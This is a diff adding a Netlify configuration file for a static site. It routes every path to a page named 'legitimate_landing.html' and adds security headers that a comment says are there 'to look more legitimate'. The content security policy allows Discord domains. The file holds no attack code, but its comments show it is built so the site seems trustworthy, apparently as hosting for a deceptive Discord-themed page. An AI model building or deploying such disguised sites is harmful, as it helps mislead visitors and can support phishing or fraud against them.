@@ -1,0 +1,33 @@
+[build]
+  # Base directory - where Netlify starts building
+  base = "."
+  
+  # Build command - leave empty for static HTML
+  command = ""
+  
+  # Publish directory - serve files directly from root
+  publish = "."
+
+[build.environment]
+  # No environment variables needed for static sites
+  
+[[redirects]]
+  # Redirect root to our main landing page
+  from = "/"
+  to = "/legitimate_landing.html"
+  status = 200
+  
+[[redirects]]
+  # Catch-all for any missing files
+  from = "/*"
+  to = "/legitimate_landing.html"
+  status = 404
+
+[[headers]]
+  # Security headers to look more legitimate
+  for = "/*"
+  [headers.values]
+    X-Frame-Options = "DENY"
+    X-Content-Type-Options = "nosniff"
+    Referrer-Policy = "strict-origin-when-cross-origin"
+    Content-Security-Policy = "default-src 'self' 'unsafe-inline' *.discord.com; img-src 'self' data:;"
